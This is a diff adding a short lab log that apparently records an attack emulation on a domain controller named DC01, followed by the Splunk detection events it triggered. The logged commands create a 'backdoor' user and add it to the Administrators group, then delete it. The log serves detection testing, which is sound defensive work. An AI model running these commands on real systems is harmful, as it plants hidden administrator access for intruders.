@@ -1,0 +1,27 @@
+=== REAL ATTACK EXECUTION ===
+Date: $(date)
+
+> whoami
+cyberlab\administrator
+
+> hostname
+DC01
+
+> net user backdoor [PASSWORD]!@ /add
+The command completed successfully.
+
+> net localgroup Administrators backdoor /add
+The command completed successfully.
+
+> net user backdoor
+User name                    backdoor
+Local Group Memberships      *Administrators
+
+> net user backdoor /delete
+The command completed successfully.
+
+=== SPLUNK DETECTION ===
+Event 4720: User account created (backdoor)
+Event 4732: Member added to Administrators group
+Event 4624: Successful logon (Logon Type 10 - WinRM)
+Event 4688: Process creation (net.exe)
